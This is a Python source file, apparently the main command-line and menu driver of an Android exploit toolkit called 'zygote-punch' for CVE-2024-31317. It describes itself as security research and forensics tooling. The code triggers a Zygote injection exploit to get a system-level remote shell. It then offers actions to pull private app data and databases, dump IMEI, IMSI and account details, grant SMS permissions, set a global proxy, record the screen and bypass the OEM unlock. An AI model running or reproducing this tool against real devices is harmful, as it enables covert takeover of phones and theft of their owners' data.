import sys
import subprocess
import os
import argparse
import socket
import threading
import time
import signal
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from .stage1 import Stage1Exploit
from .stage2 import Stage2Exploit
from .session import RemoteShellSession
from .adb_helper import AdbHelper
from .search_selinux import SELinuxAnalyzer
from .exceptions import *
from .utils import console, setup_logging, print_banner, error_exit
from .info_dump import dump_info
from .forensics import ForensicTools
from .networking import NetworkTools
from .media import MediaTools
from .package_wizard import PackageWizard
log = setup_logging()

class ToolkitContext:

    def __init__(self, serial=None, transport_id=None, usb=False, tcpip=False, port=1234):
        self.serial = serial
        self.transport_id = transport_id
        self.usb = usb
        self.tcpip = tcpip
        self.port = port
        self.session = None
        self.stage1 = None

    def ensure_connected(self):
        try:
            if not self.stage1:
                self.stage1 = Stage1Exploit(device_serial=self.serial, transport_id=self.transport_id, usb=self.usb, tcpip=self.tcpip)
            if not self.serial and self.stage1.device:
                self.serial = self.stage1.device.serial
            if not self.stage1.is_port_open(self.port):
                with console.status('[success]Triggering Zygote Injection (Stage 1)...'):
                    if not self.stage1.exploit_stage1(port=self.port):
                        return False
            if not self.session or not self.session.socket:
                self.session = RemoteShellSession(port=self.port)
                try:
                    self.session.connect()
                except Exception as e:
                    log.error(f'Failed to connect to shell session: {e}')
                    return False
            return True
        except Exception as e:
            log.exception(f'Error ensuring connection: {e}')
            return False

def kill_existing_processes():
    current_pid = os.getpid()
    try:
        cmd = ['pgrep', '-f', 'zygote_injection_toolkit']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            for pid_str in result.stdout.strip().splitlines():
                try:
                    pid = int(pid_str)
                    if pid != current_pid:
                        os.kill(pid, signal.SIGKILL)
                except:
                    pass
    except:
        pass

def interactive_shell(port=1234):
    console.print(Panel("Entering Interactive Shell. Type 'exit' to return to menu.", title='Shell', style='success'))
    try:
        with RemoteShellSession(port=port) as session:

            def forward_out():
                try:
                    while True:
                        data = session.socket.recv(1024)
                        if not data:
                            break
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                except:
                    pass
            t = threading.Thread(target=forward_out, daemon=True)
            t.start()
            session.socket.sendall(b"id; uname -a; export PS1='zygote-punch# '\n")
            while True:
                try:
                    line = sys.stdin.readline()
                    if not line:
                        break
                    if line.strip() == 'exit':
                        break
                    session.socket.sendall(line.encode())
                except EOFError:
                    break
    except KeyboardInterrupt:
        console.print('\n[warning]Returning to menu...[/]')
    except Exception as e:
        console.print(f'[error]Shell error: {e}[/]')

def list_devices():
    devices = AdbHelper.get_connected_devices()
    if not devices:
        console.print('[warning]No devices found via ADB.[/]')
        return
    table = Table(title='Connected Android Devices')
    table.add_column('Idx', style='dim')
    table.add_column('Serial', style='highlight')
    table.add_column('Transport ID', style='cyan')
    table.add_column('Type', style='magenta')
    table.add_column('Model', style='success')
    table.add_column('State')
    for i, d in enumerate(devices):
        table.add_row(str(i + 1), d['serial'], d['transport_id'], d['type'], d['model'], d['state'])
    console.print(table)

def full_interactive_mode(ctx):
    while True:
        try:
            console.clear()
            print_banner()
            status = '[success]Connected[/]' if ctx.session and ctx.session.socket else '[error]Disconnected[/]'
            info_lines = [f"Device: [highlight]{ctx.serial or 'Auto-detect'}[/]"]
            if ctx.transport_id:
                info_lines.append(f'Transport ID: [cyan]{ctx.transport_id}[/]')
            if ctx.usb:
                info_lines.append('Mode: [magenta]USB Force[/]')
            elif ctx.tcpip:
                info_lines.append('Mode: [magenta]TCP/IP Force[/]')
            info_lines.append(f'Port: [highlight]{ctx.port}[/]')
            info_lines.append(f'Status: {status}')
            console.print(Panel('\n'.join(info_lines), title='Session Info'))
            console.print('\n[info]Main Menu:[/]')
            console.print('1. [highlight]System Exploits[/] (Unlock OEM, Hidden API, etc.)')
            console.print('2. [highlight]Forensics & Info[/] (IMEI, IMSI, Accounts, Device Dump)')
            console.print('3. [highlight]App Management[/] (Backup, Restore, Permissions, Wizard)')
            console.print('4. [highlight]Network & ADB[/] (Wireless ADB, Global Proxy)')
            console.print('5. [highlight]Media & Logging[/] (Screenshot, Record, Logcat)')
            console.print('6. [highlight]Interactive Shell[/]')
            console.print('7. [highlight]SELinux Analysis[/]')
            console.print('8. [highlight]Switch/List Devices[/]')
            console.print('0. [error]Exit[/]')
            choice = Prompt.ask('\nChoice', choices=['0', '1', '2', '3', '4', '5', '6', '7', '8'])
            if choice == '0':
                break
            if choice == '8':
                list_devices()
                devices = AdbHelper.get_connected_devices()
                if devices:
                    if Confirm.ask('Switch to a specific device?'):
                        idx = IntPrompt.ask('Index', choices=[str(i + 1) for i in range(len(devices))])
                        sel_dev = devices[idx - 1]
                        mode = Prompt.ask('Select by', choices=['Serial', 'Transport ID'], default='Serial')
                        if mode == 'Serial':
                            ctx.serial = sel_dev['serial']
                            ctx.transport_id = None
                        else:
                            ctx.transport_id = sel_dev['transport_id']
                            ctx.serial = None
                        ctx.usb = False
                        ctx.tcpip = False
                        ctx.session = None
                        ctx.stage1 = None
                continue
            if not ctx.ensure_connected():
                console.print('[error]Exploit failed or device disconnected.[/]')
                time.sleep(2)
                continue
            stage2 = Stage2Exploit(session=ctx.session, port=ctx.port)
            forensics = ForensicTools(stage2)
            networking = NetworkTools(stage2)
            media = MediaTools(stage2)
            if choice == '1':
                sub_choice = Prompt.ask('System Action', choices=['Unlock OEM', 'Disable Hidden API', 'Back'])
                if sub_choice == 'Unlock OEM':
                    stage2.exploit_stage2()
                elif sub_choice == 'Disable Hidden API':
                    stage2.toggle_hidden_api()
            elif choice == '2':
                sub_choice = Prompt.ask('Forensics Action', choices=['Telephony', 'Accounts', 'Device Dump', 'Exfil DBs', 'Back'])
                if sub_choice == 'Telephony':
                    info = stage2.get_telephony_info()
                    table = Table(title='Telephony Info')
                    table.add_column('Property')
                    table.add_column('Value', style='success')
                    for k, v in info.items():
                        table.add_row(k, v)
                    console.print(table)
                    Prompt.ask('\nPress Enter')
                elif sub_choice == 'Accounts':
                    accs = stage2.get_accounts()
                    table = Table(title='Accounts')
                    table.add_column('Name')
                    table.add_column('Type', style='dim')
                    for a in accs:
                        table.add_row(a['name'], a['type'])
                    console.print(table)
                    Prompt.ask('\nPress Enter')
                elif sub_choice == 'Device Dump':
                    dump_info(ctx.serial, ctx.port)
                    Prompt.ask('\nPress Enter')
                elif sub_choice == 'Exfil DBs':
                    db_choice = Prompt.ask('Database', choices=list(ForensicTools.DATABASE_MAP.keys()) + ['Back'])
                    if db_choice != 'Back':
                        forensics.pull_forensic_database(db_choice)
                    Prompt.ask('\nPress Enter')
            elif choice == '3':
                sub_choice = Prompt.ask('App Action', choices=['Wizard', 'Backup', 'Restore', 'Grant Perm', 'Manage', 'Back'])
                if sub_choice == 'Back':
                    continue
                pkg = None
                if sub_choice == 'Wizard':
                    pkg = PackageWizard(ctx.serial).run_wizard()
                    if not pkg:
                        continue
                    sub_choice = Prompt.ask(f'Action for {pkg}', choices=['Backup', 'Grant Permission', 'Manage', 'Back'])
                else:
                    pkg = Prompt.ask('Package Name')
                if sub_choice == 'Backup':
                    stage2.backup_data(pkg, Prompt.ask('Output File', default=f'{pkg}.tar.gz'))
                elif sub_choice == 'Restore':
                    stage2.restore_data(pkg, Prompt.ask('Input File'))
                elif sub_choice == 'Grant Permission':
                    stage2.grant_permission(pkg, Prompt.ask('Permission'))
                elif sub_choice == 'Manage':
                    act = Prompt.ask('Action', choices=['stop', 'disable', 'enable', 'clear'])
                    stage2.manage_package(pkg, act)
                Prompt.ask('\nPress Enter')
            elif choice == '4':
                sub_choice = Prompt.ask('Network Action', choices=['Wireless ADB', 'Set Proxy', 'Clear Proxy', 'Back'])
                if sub_choice == 'Wireless ADB':
                    networking.enable_wireless_adb(IntPrompt.ask('Port', default=5555))
                elif sub_choice == 'Set Proxy':
                    networking.set_global_proxy(Prompt.ask('Host'), IntPrompt.ask('Port'))
                elif sub_choice == 'Clear Proxy':
                    networking.clear_global_proxy()
                Prompt.ask('\nPress Enter')
            elif choice == '5':
                sub_choice = Prompt.ask('Media Action', choices=['Screenshot', 'Record Screen', 'Logcat Dump', 'Back'])
                if sub_choice == 'Screenshot':
                    media.take_screenshot()
                elif sub_choice == 'Record Screen':
                    media.stream_screen_record(IntPrompt.ask('Duration (s)', default=10))
                elif sub_choice == 'Logcat Dump':
                    log_data = forensics.get_logcat_dump(Prompt.ask('Filter', default='Zygote'))
                    console.print(Panel(log_data, title='Logcat Dump'))
                Prompt.ask('\nPress Enter')
            elif choice == '6':
                ctx.session.close()
                interactive_shell(port=ctx.port)
                ctx.session = None
            elif choice == '7':
                analyzer = SELinuxAnalyzer(AdbHelper)
                analyzer.fetch_rules(serial=ctx.serial)
                analyzer.display_report()
                Prompt.ask('\nPress Enter to continue')
        except KeyboardInterrupt:
            if Confirm.ask('\nReally exit?'):
                break
        except Exception as e:
            console.print(f'[error]An error occurred: {e}[/]')
            time.sleep(2)

def run_toolkit(args):
    if not args.no_kill:
        kill_existing_processes()
    if args.action == 'list-devices':
        list_devices()
        return
    if not args.action:
        serial = args.serial
        if not any([serial, args.transport_id, args.usb, args.tcpip]):
            devs = AdbHelper.get_connected_devices()
            if devs:
                serial = devs[0]['serial']
        ctx = ToolkitContext(serial=serial, transport_id=args.transport_id, usb=args.usb, tcpip=args.tcpip, port=args.port)
        full_interactive_mode(ctx)
        return
    print_banner()
    if args.action == 'check':
        s1 = Stage1Exploit(device_serial=args.serial, transport_id=args.transport_id, usb=args.usb, tcpip=args.tcpip)
        try:
            etype = s1.exploit_type()
            console.print(f'[success][+] VULNERABLE! Type: {etype}[/]')
        except Exception as e:
            console.print(f'[error][-] NOT VULNERABLE: {e}[/]')
        return
    if args.action == 'info':
        dump_info(args.serial, args.port)
        return
    stage_1 = Stage1Exploit(device_serial=args.serial, transport_id=args.transport_id, usb=args.usb, tcpip=args.tcpip)
    if not stage_1.exploit_stage1(port=args.port):
        error_exit('Exploit stage 1 failed.')
    with RemoteShellSession(port=args.port) as session:
        stage2 = Stage2Exploit(session=session, port=args.port)
        if args.action == 'shell':
            session.close()
            interactive_shell(port=args.port)
        elif args.action == 'backup':
            if not args.package or not args.output:
                error_exit('--package and --output required for backup')
            stage2.backup_data(args.package, args.output)
        elif args.action == 'restore':
            if not args.package or not args.output:
                error_exit('--package and --output required for restore')
            stage2.restore_data(args.package, args.output)
        elif args.action == 'grant':
            if not args.package or not args.permission:
                error_exit('--package and --permission required')
            stage2.grant_permission(args.package, args.permission)
        elif args.action == 'hidden-api':
            stage2.toggle_hidden_api()
        elif args.action == 'package':
            if not args.package or not args.pkg_action:
                error_exit('--package and --pkg-action required')
            stage2.manage_package(args.package, args.pkg_action)
        elif args.action == 'exploit':
            stage2.exploit_stage2()
        elif args.action == 'analyze-selinux':
            analyzer = SELinuxAnalyzer(AdbHelper)
            analyzer.fetch_rules(serial=args.serial)
            analyzer.display_report()

def main():
    parser = argparse.ArgumentParser(description='\n[bold cyan]Zygote Injection Toolkit - CVE-2024-31317[/]\nAdvanced toolkit for security research and forensics on Android devices.\nAllows UID 1000 (system) code execution on vulnerable devices.\n', formatter_class=argparse.RawDescriptionHelpFormatter, epilog='\n[info]Usage Examples:[/]\n  [success]zygote-punch[/]                          # Interactive wizard (Recommended)\n  [success]zygote-punch check[/]                    # Check if the connected device is vulnerable\n  [success]zygote-punch shell[/]                    # Spawn an interactive system shell\n  [success]zygote-punch info[/]                     # Dump detailed device & forensic info\n  [success]zygote-punch list-devices[/]             # Show all connected devices with Transport IDs\n\n  # Targeted Selection:\n  [success]zygote-punch -s R58M123456X shell[/]     # Target by serial\n  [success]zygote-punch -t 15 info[/]               # Target by transport ID\n  [success]zygote-punch -d backup -p com.app[/]     # Target the only USB device\n\n  # App Management:\n  [success]zygote-punch backup -p com.pkg -o b.tg[/] # Extract private app data\n  [success]zygote-punch grant -p com.pkg --permission android.permission.READ_SMS[/]\n\n  # System Actions:\n  [success]zygote-punch hidden-api[/]               # Disable hidden API restrictions\n  [success]zygote-punch exploit[/]                  # Attempt OEM Unlock bypass\n        ')
    parser.add_argument('action', nargs='?', choices=['exploit', 'unlock', 'backup', 'restore', 'shell', 'check', 'info', 'grant', 'hidden-api', 'package', 'analyze-selinux', 'list-devices'])
    parser.add_argument('-p', '--package', help='Target package name')
    parser.add_argument('-o', '--output', help='Output file path / Input for restore')
    parser.add_argument('--permission', help='Permission to grant')
    parser.add_argument('--pkg-action', choices=['stop', 'disable', 'enable', 'clear'], help='Package action')
    parser.add_argument('-s', '--serial', help='Device serial number')
    parser.add_argument('-t', '--transport-id', help='Device transport ID')
    parser.add_argument('-d', '--usb', action='store_true', help='Force USB device (-d)')
    parser.add_argument('-e', '--tcpip', action='store_true', help='Force TCP/IP device (-e)')
    parser.add_argument('--port', type=int, default=1234, help='Local port for exploit listener')
    parser.add_argument('--no-kill', action='store_true', help="Don't kill existing instances of the toolkit")
    args = parser.parse_args()
    try:
        run_toolkit(args)
    except KeyboardInterrupt:
        console.print('\n[warning]Exiting...[/]')
        sys.exit(0)
    except Exception as e:
        log.exception(f'Fatal error: {e}')
        sys.exit(1)
if __name__ == '__main__':
    main()